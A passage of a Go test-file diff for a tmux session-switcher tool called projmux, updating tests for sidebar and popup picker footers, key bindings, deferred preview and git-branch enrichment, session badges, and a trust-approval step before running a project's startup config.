@@ -4,9 +4,12 @@ import (
 	"bytes"
 	"context"
 	"errors"
+	"io"
+	"maps"
 	"os"
 	"path/filepath"
 	"reflect"
+	"slices"
 	"strings"
 	"testing"
 	"time"
@@ -15,9 +18,13 @@ import (
 	"github.com/crevissepartners/projmux/internal/core/candidates"
 	corelayout "github.com/crevissepartners/projmux/internal/core/layout"
 	corepreview "github.com/crevissepartners/projmux/internal/core/preview"
+	"github.com/crevissepartners/projmux/internal/integrations/hooks"
 	"github.com/crevissepartners/projmux/internal/integrations/sessionstate"
+	inttmux "github.com/crevissepartners/projmux/internal/integrations/tmux"
+	"github.com/crevissepartners/projmux/internal/theme"
 	intpicker "github.com/crevissepartners/projmux/internal/ui/picker"
 	intpickercompat "github.com/crevissepartners/projmux/internal/ui/pickercompat"
+	intrender "github.com/crevissepartners/projmux/internal/ui/render"
 )
 
 func TestAppRunSwitchDefaultsToPopupAndOpensSelectedSession(t *testing.T) {
@@ -113,7 +120,7 @@ func TestAppRunSwitchDefaultsToPopupAndOpensSelectedSession(t *testing.T) {
 	if got, want := gotRunnerOptions.Prompt, "› "; got != want {
 		t.Fatalf("runner prompt = %q, want %q", got, want)
 	}
-	if got, want := gotRunnerOptions.Footer, "Enter: switch to previewed target\nCtrl-X: kill focused session\nAlt-P: pin/unpin focused directory\nLeft/Right: preview window\nAlt-Up/Alt-Down: preview pane"; got != want {
+	if got, want := gotRunnerOptions.Footer, "Preview follows the focused target.\nDestructive actions keep the current confirmation policy."; got != want {
 		t.Fatalf("runner footer = %q, want %q", got, want)
 	}
 	if got, want := gotRunnerOptions.PreviewCommand, "exec '/tmp/projmux' 'switch' 'preview' '--ui=popup' {2}"; got != want {
@@ -125,9 +132,6 @@ func TestAppRunSwitchDefaultsToPopupAndOpensSelectedSession(t *testing.T) {
 	if got, want := gotRunnerOptions.Bindings, []string{
 		"esc:abort",
 		"ctrl-n:abort",
-		"alt-1:abort",
-		"alt-2:abort",
-		"alt-3:abort",
 		"left:execute-silent(exec '/tmp/projmux' 'switch' 'cycle-window' {2} 'prev')+refresh-preview",
 		"right:execute-silent(exec '/tmp/projmux' 'switch' 'cycle-window' {2} 'next')+refresh-preview",
 		"alt-up:execute-silent(exec '/tmp/projmux' 'switch' 'cycle-pane' {2} 'prev')+refresh-preview",
@@ -154,7 +158,7 @@ func TestAppRunSwitchDefaultsToPopupAndOpensSelectedSession(t *testing.T) {
 	}
 }
 
-func TestSwitchExecuteSidebarHookProjectUsesInlineStartupAndTrust(t *testing.T) {
+func TestSwitchExecuteSidebarHookProjectLaunchesContinuationBeforeSelfClose(t *testing.T) {
 	t.Parallel()
 
 	target := t.TempDir()
@@ -164,11 +168,10 @@ func TestSwitchExecuteSidebarHookProjectUsesInlineStartupAndTrust(t *testing.T) 
 	if err := os.WriteFile(filepath.Join(target, ".projmux", "config.toml"), []byte("[startup]\nrun = \"agent\"\n"), 0o644); err != nil {
 		t.Fatal(err)
 	}
-	sessions := &capturingSwitchSessionExecutor{exists: map[string]bool{"target": false}}
 	tmuxRunner := &recordingTmuxRunner{}
 	cmd := &switchCommand{
 		tmuxRunner: tmuxRunner,
-		sessions:   sessions,
+		sessions:   &capturingSwitchSessionExecutor{exists: map[string]bool{"target": false}},
 		executable: func() (string, error) { return "/tmp/projmux", nil },
 		identity:   stubSwitchIdentityResolver{name: "target"},
 		lookupEnv: func(name string) string {
@@ -190,11 +193,165 @@ func TestSwitchExecuteSidebarHookProjectUsesInlineStartupAndTrust(t *testing.T) 
 	if reopen {
 		t.Fatal("execute() reopen = true, want false")
 	}
-	if got, want := sessions.calls, []string{"authorize:" + target, "ensure:target", "open:target"}; !equalStrings(got, want) {
-		t.Fatalf("calls = %q, want inline trust then open", got)
+	if len(tmuxRunner.calls) != 1 {
+		t.Fatalf("tmux calls = %#v, want one run-shell continuation", tmuxRunner.calls)
 	}
-	if len(tmuxRunner.calls) != 0 {
-		t.Fatalf("tmux calls = %#v, want no display-popup handoff", tmuxRunner.calls)
+	call := tmuxRunner.calls[0]
+	if call.name != "tmux" || len(call.args) != 3 || !reflect.DeepEqual(call.args[:2], []string{"run-shell", "-b"}) {
+		t.Fatalf("tmux call = %#v, want detached continuation", call)
+	}
+	command := call.args[2]
+	for _, want := range []string{
+		"PROJMUX_HOOK_TRUST_TARGET_CLIENT='/dev/pts/9'",
+		"PROJMUX_SWITCH_TARGET_CLIENT='/dev/pts/9'",
+		"'/tmp/projmux' 'switch' 'sidebar-open'",
+		"'--path' " + tmuxShellQuote(target),
+		"'--session' 'target'",
+		"'--mode' 'empty'",
+		"'--client' '/dev/pts/9'",
+	} {
+		if !strings.Contains(command, want) {
+			t.Fatalf("continuation command = %q, want substring %q", command, want)
+		}
+	}
+	if strings.Contains(command, "display-popup -C") {
+		t.Fatalf("continuation command = %q, should not self-close before launching", command)
+	}
+}
+
+func TestSwitchExecuteSidebarTrustDenyRefreshesWithoutSessionCreate(t *testing.T) {
+	t.Parallel()
+
+	target := t.TempDir()
+	sessions := &capturingSwitchSessionExecutor{authorizeSet: true, authorizeResult: false}
+	tmuxRunner := &recordingTmuxRunner{}
+	cmd := &switchCommand{
+		sessions:   sessions,
+		tmuxRunner: tmuxRunner,
+		executable: func() (string, error) { return "/tmp/projmux", nil },
+	}
+
+	err := cmd.runSidebarOpen([]string{
+		"--path", target,
+		"--session", "target",
+		"--mode", projectStartupKindEmpty,
+		"--query", "tar",
+		"--client", "/dev/pts/9",
+	}, &bytes.Buffer{})
+	if err != nil {
+		t.Fatalf("runSidebarOpen() error = %v", err)
+	}
+	if sessions.ensureSessionName != "" || sessions.restoreSessionName != "" || sessions.openSessionName != "" {
+		t.Fatalf("deny should not create/replay/open: %#v", sessions)
+	}
+	if got, want := sessions.calls, []string{"authorize:" + target}; !equalStrings(got, want) {
+		t.Fatalf("calls = %q, want %q", got, want)
+	}
+	if len(tmuxRunner.calls) != 2 {
+		t.Fatalf("tmux calls = %#v, want close then reopen", tmuxRunner.calls)
+	}
+	if got, want := tmuxRunner.calls[0], (recordedTmuxCall{name: "tmux", args: []string{"display-popup", "-c", "/dev/pts/9", "-C"}}); !reflect.DeepEqual(got, want) {
+		t.Fatalf("close call = %#v, want %#v", got, want)
+	}
+	reopen := tmuxRunner.calls[1]
+	if reopen.name != "tmux" || len(reopen.args) != 3 || !reflect.DeepEqual(reopen.args[:2], []string{"run-shell", "-b"}) {
+		t.Fatalf("reopen call = %#v, want detached popup-toggle", reopen)
+	}
+	command := reopen.args[2]
+	for _, want := range []string{
+		switchInitialQueryEnv + "='tar'",
+		switchInitialSelectionEnv + "=" + tmuxShellQuote(target),
+		switchStatusMessageEnv + "='Trust denied'",
+		"'/tmp/projmux' 'tmux' 'popup-toggle' '--client' '/dev/pts/9' 'sessionizer-sidebar'",
+	} {
+		if !strings.Contains(command, want) {
+			t.Fatalf("reopen command = %q, want substring %q", command, want)
+		}
+	}
+}
+
+func TestSwitchSidebarOpenApproveContinuesSelectedEmptyOpen(t *testing.T) {
+	t.Parallel()
+
+	target := t.TempDir()
+	sessions := &capturingSwitchSessionExecutor{authorizeSet: true, authorizeResult: true}
+	tmuxRunner := &recordingTmuxRunner{}
+	cmd := &switchCommand{
+		sessions:   sessions,
+		tmuxRunner: tmuxRunner,
+		executable: func() (string, error) { return "/tmp/projmux", nil },
+	}
+
+	err := cmd.runSidebarOpen([]string{
+		"--path", target,
+		"--session", "target",
+		"--mode", projectStartupKindEmpty,
+		"--client", "/dev/pts/9",
+	}, &bytes.Buffer{})
+	if err != nil {
+		t.Fatalf("runSidebarOpen() error = %v", err)
+	}
+	if got, want := sessions.calls, []string{"authorize:" + target, "ensure:target", "open:target"}; !equalStrings(got, want) {
+		t.Fatalf("calls = %q, want %q", got, want)
+	}
+	if len(tmuxRunner.calls) != 1 {
+		t.Fatalf("tmux calls = %#v, want only sidebar close", tmuxRunner.calls)
+	}
+	if got, want := tmuxRunner.calls[0], (recordedTmuxCall{name: "tmux", args: []string{"display-popup", "-c", "/dev/pts/9", "-C"}}); !reflect.DeepEqual(got, want) {
+		t.Fatalf("close call = %#v, want %#v", got, want)
+	}
+}
+
+func TestSwitchSidebarOpenTrustPopupUsesClientScope(t *testing.T) {
+	t.Parallel()
+
+	target := t.TempDir()
+	tmuxRunner := &recordingTmuxRunner{}
+	popupRunner := &hookTrustPopupRecordingRunner{}
+	var cmd *switchCommand
+	sessions := &sidebarOpenTrustPopupExecutor{
+		lookupEnv: func(name string) string { return cmd.lookupEnv(name) },
+		executable: func() (string, error) {
+			return "/tmp/projmux", nil
+		},
+		popupRunner: popupRunner,
+	}
+	cmd = &switchCommand{
+		sessions:   sessions,
+		tmuxRunner: tmuxRunner,
+		executable: func() (string, error) { return "/tmp/projmux", nil },
+		lookupEnv: func(name string) string {
+			if name == "TMUX" {
+				return "/tmp/tmux/default,1,0"
+			}
+			return ""
+		},
+	}
+
+	err := cmd.runSidebarOpen([]string{
+		"--path", target,
+		"--session", "target",
+		"--mode", projectStartupKindEmpty,
+		"--client", "/dev/pts/9",
+	}, &bytes.Buffer{})
+	if err != nil {
+		t.Fatalf("runSidebarOpen() error = %v", err)
+	}
+	if got, want := sessions.calls, []string{"authorize:" + target, "ensure:target", "open:target"}; !equalStrings(got, want) {
+		t.Fatalf("calls = %q, want %q", got, want)
+	}
+	if len(popupRunner.calls) != 1 {
+		t.Fatalf("trust popup calls = %#v, want one display-popup", popupRunner.calls)
+	}
+	call := popupRunner.calls[0]
+	if call.name != "tmux" || len(call.args) == 0 || call.args[0] != "display-popup" {
+		t.Fatalf("trust popup call = %#v, want display-popup", call)
+	}
+	if !containsTmuxArgPair(call.args, "-c", "/dev/pts/9") {
+		t.Fatalf("trust popup args = %#v, want client scope", call.args)
+	}
+	if containsTmuxArg(call.args, "-t") {
+		t.Fatalf("trust popup args = %#v, want no unrelated pane target", call.args)
 	}
 }
 
@@ -318,6 +475,9 @@ func TestAppRunSwitchDeprecatedBackendValueUsesNativeRunner(t *testing.T) {
 	if len(gotNativeOptions.Items) != 1 || gotNativeOptions.Items[0].Value != "/home/tester/workspace" {
 		t.Fatalf("native items = %#v, want switch picker item", gotNativeOptions.Items)
 	}
+	if gotNativeOptions.Theme == nil || gotNativeOptions.Theme.Background.Source != theme.SourceFallback {
+		t.Fatalf("native theme = %#v, want fallback effective theme populated", gotNativeOptions.Theme)
+	}
 	if got := gotNativeOptions.Items[0].MetaLines; len(got) != 0 {
 		t.Fatalf("native item meta lines = %#v, want merged into Label to avoid duplicate card metadata", got)
 	}
@@ -365,29 +525,51 @@ func TestSwitchCommandSupportsSidebarUI(t *testing.T) {
 	if got, want := gotRunnerOptions.Prompt, "› "; got != want {
 		t.Fatalf("runner prompt = %q, want %q", got, want)
 	}
-	if got, want := gotRunnerOptions.Footer, "C-x: kill | M-p: pin"; got != want {
+	if got, want := gotRunnerOptions.Footer, "Alt-P: pin project  |  Ctrl-X: kill session"; got != want {
 		t.Fatalf("runner footer = %q, want %q", got, want)
 	}
-	if got, want := gotRunnerOptions.PreviewCommand, "exec '/tmp/projmux' 'switch' 'preview' '--ui=sidebar' {2}"; got != want {
-		t.Fatalf("runner preview command = %q, want %q", got, want)
+	if got, want := gotRunnerOptions.PreviewCommand, ""; got != want {
+		t.Fatalf("runner preview command = %q, want deferred preview", got)
 	}
 	if got, want := gotRunnerOptions.PreviewWindow, "down,25%,border-top"; got != want {
-		t.Fatalf("runner preview window = %q, want %q", got, want)
+		t.Fatalf("runner preview window = %q, want reserved deferred preview frame %q", got, want)
 	}
 	if got, want := gotRunnerOptions.Bindings, []string{
 		"esc:abort",
 		"ctrl-n:abort",
 		"alt-1:abort",
-		"alt-2:abort",
-		"alt-3:abort",
 		"focus:execute-silent(exec '/tmp/projmux' 'switch' 'sidebar-focus' {2})",
 	}; !equalStrings(got, want) {
 		t.Fatalf("runner bindings = %q, want %q", got, want)
 	}
 	if got, want := gotRunnerOptions.Entries, []intpickercompat.Entry{
-		{Label: "\x1b[1m\x1b[32mapp\x1b[0m\n  \x1b[38;5;242m/tmp/app\x1b[0m", Value: "/tmp/app"},
+		expectedSidebarEntry("app", "/tmp/app", "/tmp/app", "existing", false),
 	}; !equalEntries(got, want) {
 		t.Fatalf("runner entries = %#v, want %#v", got, want)
+	}
+}
+
+func TestSwitchSidebarFooterReadsKeymapGuide(t *testing.T) {
+	t.Parallel()
+
+	home := t.TempDir()
+	keymapPath := filepath.Join(home, ".config", "projmux", "keymap.toml")
+	if err := os.MkdirAll(filepath.Dir(keymapPath), 0o755); err != nil {
+		t.Fatalf("MkdirAll() error = %v", err)
+	}
+	if err := os.WriteFile(keymapPath, []byte(`[bindings."Sidebar:PinProject"]
+keys = ["p", "M-p"]
+
+[bindings."Sidebar:KillSession"]
+keys = ["K"]
+`), 0o644); err != nil {
+		t.Fatalf("WriteFile() error = %v", err)
+	}
+
+	got := switchPickerFooter(switchUISidebar, "", func() (string, error) { return home, nil }, func(string) string { return "" })
+	want := "Alt-P: pin project  |  K: kill session"
+	if got != want {
+		t.Fatalf("switchPickerFooter() = %q, want %q", got, want)
 	}
 }
 
@@ -436,18 +618,23 @@ func TestSwitchCommandNativeSidebarSetsTitle(t *testing.T) {
 func TestSwitchCommandSidebarRowsIncludeAttentionBadge(t *testing.T) {
 	t.Parallel()
 
-	var gotRunnerOptions intpickercompat.Options
-	runner, native := scriptedPicker(t, []pickerStep{
-		{observe: func(o intpickercompat.Options) { gotRunnerOptions = o }},
-	})
+	var gotNativeOptions intpicker.Options
+	var gotDeferred intpicker.DeferredUpdate
 	cmd := &switchCommand{
 		discover: func(candidates.Inputs) ([]string, error) {
 			return []string{"/tmp/app"}, nil
 		},
-		pinStore:     func() (switchPinStore, error) { return &stubSwitchPinStore{}, nil },
-		runner:       runner,
-		nativePicker: native,
-		sessions:     &capturingSwitchSessionExecutor{exists: map[string]bool{"tmp-app": true}},
+		pinStore: func() (switchPinStore, error) { return &stubSwitchPinStore{}, nil },
+		nativePicker: pickerRunnerFunc(func(options intpicker.Options) (intpicker.Result, error) {
+			gotNativeOptions = options
+			var err error
+			gotDeferred, err = options.DeferredUpdate()
+			if err != nil {
+				t.Fatalf("DeferredUpdate() error = %v", err)
+			}
+			return intpicker.Result{}, nil
+		}),
+		sessions: &capturingSwitchSessionExecutor{exists: map[string]bool{"tmp-app": true}},
 		inventory: &stubPreviewInventory{panes: []corepreview.Pane{{
 			SessionName:    "tmp-app",
 			Title:          "server",
@@ -464,8 +651,309 @@ func TestSwitchCommandSidebarRowsIncludeAttentionBadge(t *testing.T) {
 		t.Fatalf("Run() error = %v", err)
 	}
 
-	if got, want := gotRunnerOptions.Entries[0].Label, "\x1b[1m\x1b[32mapp\x1b[0m \x1b[33m●\x1b[0m\n  \x1b[38;5;242m/tmp/app\x1b[0m"; got != want {
-		t.Fatalf("runner entry = %q, want %q", got, want)
+	initialLabel := gotNativeOptions.Items[0].EffectiveLabel()
+	if got, want := len(strings.Split(initialLabel, "\n")), 3; got != want {
+		t.Fatalf("initial row line count = %d, want card-like 3-line sidebar row: %q", got, initialLabel)
+	}
+	deferredLabel := gotDeferred.Items[0].EffectiveLabel()
+	if got, want := len(strings.Split(deferredLabel, "\n")), 3; got != want {
+		t.Fatalf("deferred row line count = %d, want card-like 3-line sidebar row: %q", got, deferredLabel)
+	}
+	if !strings.Contains(deferredLabel, "●") {
+		t.Fatalf("deferred entry = %q, want attention marker", deferredLabel)
+	}
+	if got, want := gotDeferred.Preview.Window, "down,25%,border-top"; got != want {
+		t.Fatalf("deferred preview window = %q, want %q", got, want)
+	}
+}
+
+func TestSwitchCommandSidebarUsesBulkExistingSessionMap(t *testing.T) {
+	t.Parallel()
+
+	executor := &bulkSwitchSessionExecutor{existing: map[string]bool{"tmp-live": true}}
+	cmd := &switchCommand{
+		sessions: executor,
+		identity: switchIdentityResolverFunc(func(path string) (string, error) {
+			switch path {
+			case "/tmp/live":
+				return "tmp-live", nil
+			case "/tmp/new":
+				return "tmp-new", nil
+			default:
+				return "", errors.New("unexpected path")
+			}
+		}),
+		pinStore: func() (switchPinStore, error) { return &stubSwitchPinStore{}, nil },
+		homeDir:  func() (string, error) { return "/home/tester", nil },
+	}
+
+	rows, _, _, err := cmd.renderRows(context.Background(), switchUISidebar, []string{"/tmp/live", "/tmp/new"})
+	if err != nil {
+		t.Fatalf("renderRows() error = %v", err)
+	}
+	if executor.bulkCalls != 1 {
+		t.Fatalf("ExistingSessions calls = %d, want 1", executor.bulkCalls)
+	}
+	if len(executor.existsCalls) != 0 {
+		t.Fatalf("SessionExists calls = %q, want none", executor.existsCalls)
+	}
+	if got, want := rows[0].Value, "/tmp/live"; got != want {
+		t.Fatalf("first row value = %q, want existing session first", got)
+	}
+	if !strings.Contains(rows[0].Label, "\x1b[32mlive\x1b[0m") {
+		t.Fatalf("existing row label = %q, want existing styling", rows[0].Label)
+	}
+	if !strings.Contains(rows[1].Label, "new") || strings.Contains(rows[1].Label, "\x1b[32mnew") {
+		t.Fatalf("new row label = %q, want new styling", rows[1].Label)
+	}
+}
+
+func TestSwitchCommandBulkExistingSessionFailureFallsBackPerCandidate(t *testing.T) {
+	t.Parallel()
+
+	executor := &bulkSwitchSessionExecutor{
+		existing: map[string]bool{"tmp-live": true},
+		bulkErr:  errors.New("list failed"),
+	}
+	cmd := &switchCommand{
+		sessions: executor,
+		identity: switchIdentityResolverFunc(func(path string) (string, error) {
+			switch path {
+			case "/tmp/live":
+				return "tmp-live", nil
+			case "/tmp/live-copy":
+				return "tmp-live", nil
+			case "/tmp/new":
+				return "tmp-new", nil
+			default:
+				return "", errors.New("unexpected path")
+			}
+		}),
+		pinStore: func() (switchPinStore, error) { return &stubSwitchPinStore{}, nil },
+		homeDir:  func() (string, error) { return "/home/tester", nil },
+	}
+
+	if _, _, _, err := cmd.renderRows(context.Background(), switchUISidebar, []string{"/tmp/live", "/tmp/live-copy", "/tmp/new"}); err != nil {
+		t.Fatalf("renderRows() error = %v", err)
+	}
+	if executor.bulkCalls != 1 {
+		t.Fatalf("ExistingSessions calls = %d, want 1", executor.bulkCalls)
+	}
+	if got, want := sortedStrings(executor.existsCalls), []string{"tmp-live", "tmp-new"}; !equalStrings(got, want) {
+		t.Fatalf("SessionExists calls = %q, want unique fallback calls %q", got, want)
+	}
+}
+
+func TestSwitchCommandNativeSidebarDefersGitWindowsAttentionAndPreview(t *testing.T) {
+	t.Parallel()
+
+	var gitCalls []string
+	inventory := &stubPreviewInventory{
+		windows: []corepreview.Window{{Index: "0", Name: "main", Active: true}},
+		panes: []corepreview.Pane{{
+			SessionName:    "tmp-app",
+			WindowIndex:    "0",
+			Title:          "server",
+			AttentionState: attentionStateBusy,
+		}},
+	}
+	cmd := &switchCommand{
+		discover: func(candidates.Inputs) ([]string, error) {
+			return []string{"/tmp/app"}, nil
+		},
+		pinStore: func() (switchPinStore, error) { return &stubSwitchPinStore{}, nil },
+		nativePicker: pickerRunnerFunc(func(options intpicker.Options) (intpicker.Result, error) {
+			if len(gitCalls) != 0 {
+				t.Fatalf("git calls before first paint = %q, want none", gitCalls)
+			}
+			if len(inventory.sessionWindowsSessions) != 0 || len(inventory.sessionPanesSessions) != 0 {
+				t.Fatalf("inventory before first paint = windows %q panes %q, want none", inventory.sessionWindowsSessions, inventory.sessionPanesSessions)
+			}
+			if options.Preview.Command != "" {
+				t.Fatalf("preview command before first paint = %q, want deferred", options.Preview.Command)
+			}
+			if options.Preview.Window != "down,25%,border-top" {
+				t.Fatalf("preview window before first paint = %q, want reserved deferred preview frame", options.Preview.Window)
+			}
+			initialLabel := options.Items[0].EffectiveLabel()
+			if got, want := len(strings.Split(initialLabel, "\n")), 3; got != want {
+				t.Fatalf("initial row line count = %d, want card-like 3-line sidebar row: %q", got, initialLabel)
+			}
+			if strings.Contains(initialLabel, "branch-main") || strings.Contains(initialLabel, " server ") || strings.Contains(initialLabel, "●") {
+				t.Fatalf("initial item = %q, want reserved lanes without metadata", initialLabel)
+			}
+			update, err := options.DeferredUpdate()
+			if err != nil {
+				t.Fatalf("DeferredUpdate() error = %v", err)
+			}
+			if update.Preview.Command == "" || update.Preview.Window != "down,25%,border-top" {
+				t.Fatalf("deferred preview = %#v, want sidebar preview command", update.Preview)
+			}
+			label := update.Items[0].EffectiveLabel()
+			for _, want := range []string{"branch-main", " main ", "●"} {
+				if !strings.Contains(label, want) {
+					t.Fatalf("deferred label = %q, want metadata %q", label, want)
+				}
+			}
+			return intpicker.Result{}, nil
+		}),
+		sessions:   &capturingSwitchSessionExecutor{exists: map[string]bool{"tmp-app": true}},
+		inventory:  inventory,
+		executable: func() (string, error) { return "/tmp/projmux", nil },
+		gitBranch: func(path string) string {
+			gitCalls = append(gitCalls, path)
+			return "branch-main"
+		},
+		identity:   stubSwitchIdentityResolver{name: "tmp-app"},
+		validate:   func(string) error { return nil },
+		homeDir:    func() (string, error) { return "/home/tester", nil },
+		workingDir: func() (string, error) { return "/tmp", nil },
+	}
+
+	if err := cmd.Run([]string{"--ui=sidebar"}, &bytes.Buffer{}, &bytes.Buffer{}); err != nil {
+		t.Fatalf("Run() error = %v", err)
+	}
+	if got, want := gitCalls, []string{"/tmp/app"}; !equalStrings(got, want) {
+		t.Fatalf("git calls after deferred update = %q, want %q", got, want)
+	}
+	if got, want := inventory.sessionWindowsSessions, []string{"tmp-app"}; !equalStrings(got, want) {
+		t.Fatalf("SessionWindows calls = %q, want %q", got, want)
+	}
+	if got, want := inventory.sessionPanesSessions, []string{"", "tmp-app"}; !equalStrings(got, want) {
+		t.Fatalf("SessionPanes calls = %q, want all-session attention plus row tabs %q", got, want)
+	}
+}
+
+func TestSwitchCommandDeferredSidebarEnrichmentUpdatesAllRowsWithoutChangingValues(t *testing.T) {
+	t.Parallel()
+
+	inventory := &stubPreviewInventory{
+		windows: []corepreview.Window{{Index: "0", Name: "main", Active: true}},
+		panes: []corepreview.Pane{
+			{SessionName: "tmp-api", WindowIndex: "0", Title: "api", AttentionState: attentionStateReply},
+			{SessionName: "tmp-web", WindowIndex: "0", Title: "web", AttentionState: attentionStateBusy},
+		},
+	}
+	cmd := &switchCommand{
+		discover: func(candidates.Inputs) ([]string, error) {
+			return []string{"/tmp/api", "/tmp/web"}, nil
+		},
+		pinStore: func() (switchPinStore, error) { return &stubSwitchPinStore{}, nil },
+		nativePicker: pickerRunnerFunc(func(options intpicker.Options) (intpicker.Result, error) {
+			initialValues := pickerItemValues(options.Items)
+			update, err := options.DeferredUpdate()
+			if err != nil {
+				t.Fatalf("DeferredUpdate() error = %v", err)
+			}
+			if got := pickerItemValues(update.Items); !equalStrings(got, initialValues) {
+				t.Fatalf("deferred values = %q, want unchanged %q", got, initialValues)
+			}
+			if got := pickerItemSearchTexts(update.Items); !equalStrings(got, pickerItemSearchTexts(options.Items)) {
+				t.Fatalf("deferred search texts = %q, want unchanged", got)
+			}
+			labels := strings.Join([]string{update.Items[0].EffectiveLabel(), update.Items[1].EffectiveLabel()}, "\n")
+			for _, want := range []string{"api-branch", "web-branch", " main ", "●"} {
+				if !strings.Contains(labels, want) {
+					t.Fatalf("deferred labels = %q, want metadata %q", labels, want)
+				}
+			}
+			return intpicker.Result{Value: "/tmp/web"}, nil
+		}),
+		sessions: &capturingSwitchSessionExecutor{exists: map[string]bool{
+			"tmp-api": true,
+			"tmp-web": true,
+		}},
+		inventory:  inventory,
+		executable: func() (string, error) { return "/tmp/projmux", nil },
+		gitBranch: func(path string) string {
+			return strings.TrimPrefix(path, "/tmp/") + "-branch"
+		},
+		identity: switchIdentityResolverFunc(func(path string) (string, error) {
+			return "tmp-" + strings.TrimPrefix(path, "/tmp/"), nil
+		}),
+		validate:   func(string) error { return nil },
+		homeDir:    func() (string, error) { return "/home/tester", nil },
+		workingDir: func() (string, error) { return "/tmp", nil },
+	}
+
+	if err := cmd.Run([]string{"--ui=sidebar"}, &bytes.Buffer{}, &bytes.Buffer{}); err != nil {
+		t.Fatalf("Run() error = %v", err)
+	}
+}
+
+func TestSwitchCommandSidebarAggregatesSemanticBadgePriority(t *testing.T) {
+	t.Parallel()
+
+	inventory := &stubPreviewInventory{
+		windows: []corepreview.Window{
+			{Index: "0", Name: "main", Active: true},
+			{Index: "1", Name: "worker"},
+		},
+		panes: []corepreview.Pane{
+			{SessionName: "tmp-app", WindowIndex: "0", Title: "running", AIState: "thinking", AIBadgeKind: aiBadgeKindInProgress},
+			{SessionName: "tmp-app", WindowIndex: "0", Title: "done", AIState: "waiting", AIBadgeKind: aiBadgeKindResponseComplete},
+			{SessionName: "tmp-app", WindowIndex: "1", Title: "approve", AIState: "waiting", AIBadgeKind: aiBadgeKindApprovalRequired},
+		},
+	}
+	cmd := &switchCommand{
+		discover: func(candidates.Inputs) ([]string, error) {
+			return []string{"/tmp/app"}, nil
+		},
+		pinStore: func() (switchPinStore, error) { return &stubSwitchPinStore{}, nil },
+		nativePicker: pickerRunnerFunc(func(options intpicker.Options) (intpicker.Result, error) {
+			update, err := options.DeferredUpdate()
+			if err != nil {
+				t.Fatalf("DeferredUpdate() error = %v", err)
+			}
+			label := update.Items[0].EffectiveLabel()
+			if !strings.Contains(label, "\x1b[38;5;214m●\x1b[0m") {
+				t.Fatalf("deferred label = %q, want prompt-required warning badge", label)
+			}
+			if !strings.Contains(label, " main ") || !strings.Contains(label, " worker ") {
+				t.Fatalf("deferred label = %q, want both semantic window tabs", label)
+			}
+			return intpicker.Result{}, nil
+		}),
+		sessions:   &capturingSwitchSessionExecutor{exists: map[string]bool{"tmp-app": true}},
+		inventory:  inventory,
+		executable: func() (string, error) { return "/tmp/projmux", nil },
+		identity:   stubSwitchIdentityResolver{name: "tmp-app"},
+		validate:   func(string) error { return nil },
+		homeDir:    func() (string, error) { return "/home/tester", nil },
+		workingDir: func() (string, error) { return "/tmp", nil },
+	}
+
+	if err := cmd.Run([]string{"--ui=sidebar"}, &bytes.Buffer{}, &bytes.Buffer{}); err != nil {
+		t.Fatalf("Run() error = %v", err)
+	}
+}
+
+func TestSwitchCommandPopupRowsUseSemanticSessionBadge(t *testing.T) {
+	t.Parallel()
+
+	cmd := &switchCommand{
+		sessions: &capturingSwitchSessionExecutor{exists: map[string]bool{"tmp-app": true}},
+		inventory: &stubPreviewInventory{
+			windows: []corepreview.Window{{Index: "0", Name: "main", Active: true}},
+			panes: []corepreview.Pane{
+				{SessionName: "tmp-app", WindowIndex: "0", Title: "work", AIBadgeKind: aiBadgeKindInProgress},
+				{SessionName: "tmp-app", WindowIndex: "0", Title: "approve", AIBadgeKind: aiBadgeKindInputRequired},
+			},
+		},
+		identity: stubSwitchIdentityResolver{name: "tmp-app"},
+		pinStore: func() (switchPinStore, error) { return &stubSwitchPinStore{}, nil },
+		homeDir:  func() (string, error) { return "/home/tester", nil },
+	}
+
+	rows, _, _, err := cmd.renderRows(context.Background(), switchUIPopup, []string{"/tmp/app"})
+	if err != nil {
+		t.Fatalf("renderRows() error = %v", err)
+	}
+	if len(rows) != 1 {
+		t.Fatalf("rows = %#v, want one existing popup row", rows)
+	}
+	if !strings.Contains(rows[0].Label, "\x1b[38;5;214m●\x1b[0m") {
+		t.Fatalf("popup label = %q, want semantic prompt warning badge", rows[0].Label)
 	}
 }
 
@@ -516,8 +1004,6 @@ func TestSwitchCommandSidebarUsesContextSessionForInitialPosition(t *testing.T) 
 		"esc:abort",
 		"ctrl-n:abort",
 		"alt-1:abort",
-		"alt-2:abort",
-		"alt-3:abort",
 		"focus:execute-silent(exec '/tmp/projmux' 'switch' 'sidebar-focus' {2})",
 		"start:pos(1)",
 	}; !equalStrings(got, want) {
@@ -701,6 +1187,52 @@ func TestSwitchSidebarProjectOpenShowsStartupStepWithoutDisplayPopupHandoff(t *t
 	}
 }
 
+func TestProjectStartupPickerLabelStateColors(t *testing.T) {
+	t.Parallel()
+
+	cases := []struct {
+		name      string
+		candidate projectStartupCandidate
+		wantColor string
+	}{
+		{
+			name:      "latest snapshot action",
+			candidate: projectStartupCandidate{Kind: projectStartupKindLatest, Description: "saved"},
+			wantColor: settingsColorType,
+		},
+		{
+			name:      "named snapshot action",
+			candidate: projectStartupCandidate{Kind: projectStartupKindNamed, Name: "team", Description: "manual"},
+			wantColor: settingsColorType,
+		},
+		{
+			name:      "empty session back tone",
+			candidate: projectStartupCandidate{Kind: projectStartupKindEmpty, Description: "start without restoring"},
+			wantColor: settingsColorBack,
+		},
+		{
+			name:      "back row secondary tone",
+			candidate: projectStartupCandidate{Kind: projectStartupKindBack, Description: "return"},
+			wantColor: settingsColorBack,
+		},
+		{
+			name:      "unknown info tone",
+			candidate: projectStartupCandidate{Kind: "other", Label: "Other", Description: "metadata"},
+			wantColor: settingsColorInfo,
+		},
+	}
+
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			t.Parallel()
+			label := projectStartupPickerLabel(tc.candidate)
+			if !strings.Contains(label, tc.wantColor) {
+				t.Fatalf("projectStartupPickerLabel(%s) = %q, want color %q", tc.name, label, tc.wantColor)
+			}
+		})
+	}
+}
+
 func TestAppRunLayoutCommandRemovedFromPublicSurface(t *testing.T) {
 	t.Parallel()
 
@@ -856,8 +1388,138 @@ func TestSwitchProjectOpenNamedSnapshotSelectionRestoresAndOpens(t *testing.T) {
 	if got, want := executor.openSessionName, "workspace"; got != want {
 		t.Fatalf("open session = %q, want %q", got, want)
 	}
-	if got, want := executor.calls, []string{"authorize:" + project, "restore:workspace:" + wantSource, "open:workspace"}; !equalStrings(got, want) {
+	if got, want := executor.calls, []string{
+		"authorize:" + project,
+		"authorize-layout:.projmux/layouts/team.toml",
+		"restore:workspace:" + wantSource,
+		"open:workspace",
+	}; !equalStrings(got, want) {
 		t.Fatalf("calls = %q, want %q", got, want)
+	}
